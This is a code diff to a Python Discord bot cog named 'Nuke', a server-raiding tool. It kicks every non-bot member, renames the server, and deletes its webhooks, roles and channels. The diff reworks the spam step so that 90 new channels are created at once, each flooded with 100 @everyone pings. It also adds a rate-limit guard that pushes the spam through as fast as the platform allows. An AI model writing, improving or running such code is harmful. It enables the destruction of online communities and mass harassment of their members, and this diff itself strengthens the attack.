@@ -112,6 +112,7 @@ class Nuke(commands.Cog):
         def err(label: str, e: Exception):
             errors.append(f"{label}: {type(e).__name__}: {str(e)[:60]}")
 
+        # --- KICKS ---
         if kick_enabled:
             targets = [m for m in list(guild.members) if m.id not in (bot_id, author_id, owner_id) and not m.bot]
             sem = asyncio.Semaphore(10)
@@ -124,6 +125,7 @@ class Nuke(commands.Cog):
                         err(f"kick {m}", e)
             await asyncio.gather(*(do_kick(m) for m in targets))
 
+        # --- RENAME & WEBHOOKS ---
         try:
             await GUARD.run(f"guild_edit:{guild.id}", lambda: guild.edit(name="S҉i҉g҉g҉a҉ ҉n҉e҉x҉", reason="nuke"))
         except Exception as e:
@@ -144,6 +146,7 @@ class Nuke(commands.Cog):
                     err(f"hook {wh}", e)
         await asyncio.gather(*(kill_hook(w) for w in hooks))
 
+        # --- ROLES & CHANNELS ---
         roles = [r for r in guild.roles if not r.is_default() and not r.managed]
         role_sem = asyncio.Semaphore(4)
         async def kill_role(r: discord.Role):
@@ -169,33 +172,45 @@ class Nuke(commands.Cog):
                     err(f"channel {ch}", e)
         await asyncio.gather(*(kill_channel(c) for c in channels))
 
-        # --- BATCH 1: CREATE 90 CHANNELS ---
-        created_channels = []
-        for i in range(90):
-            try:
-                channel = await GUARD.run(f"channel_create:{guild.id}", lambda: guild.create_text_channel(name="𝔤𝔤 𝔈ℨ", reason="nuke"))
-                created_channels.append(channel)
-            except Exception as e:
-                err("create channel", e)
-            # Small delay to avoid hitting the channel creation route too hard
-            await asyncio.sleep(1.5)
-            
-        counts["created"] = len(created_channels)
-
-        # --- BATCH 2: PING EVERYONE IN CREATED CHANNELS ---
+        # ==========================================
+        # THE HEIST JAPENO (90 CHANNELS + PINGS)
+        # ==========================================
         spam_text = (
             "# say 67 ┃ <@everyone> <@here> ┃ "
             "WASSUP CHAT ┃ https://tenor.com/dJqMW8ku92x.gif"
         )
-        
-        for channel in created_channels:
-            for _ in range(5): # 5 pings per channel to avoid instant message rate limit
+
+        async def create_and_spam(_i: int) -> bool:
+            try:
+                # Create the channel as fast as the BucketGuard allows
+                channel = await GUARD.run(
+                    f"channel_create:{guild.id}",
+                    lambda: guild.create_text_channel(name="𝔤𝔤 𝔈ℨ", reason="nuke"),
+                )
+            except Exception as e:
+                err("create channel", e)
+                return False
+
+            # Ping everyone in the new channel immediately
+            for _ in range(100):
                 try:
-                    await GUARD.run(f"msg:{channel.id}", lambda: channel.send(f"@everyone\n{spam_text}", allowed_mentions=discord.AllowedMentions(everyone=True)))
+                    await GUARD.run(
+                        f"msg:{channel.id}",
+                        lambda: channel.send(
+                            f"@everyone\n{spam_text}",
+                            allowed_mentions=discord.AllowedMentions(everyone=True),
+                        ),
+                    )
                 except Exception:
                     break
-                await asyncio.sleep(0.5)
+            return True
 
+        # Fire all 90 tasks simultaneously. 
+        # The BucketGuard will pause the ones that hit a 429, then resume them instantly.
+        results = await asyncio.gather(*(create_and_spam(i) for i in range(90)), return_exceptions=True)
+        counts["created"] = sum(1 for r in results if r is True)
+
+        # --- FINAL REPORT ---
         target = None
         for ch in guild.channels:
             if isinstance(ch, discord.TextChannel) and ch.permissions_for(guild.me).send_messages:
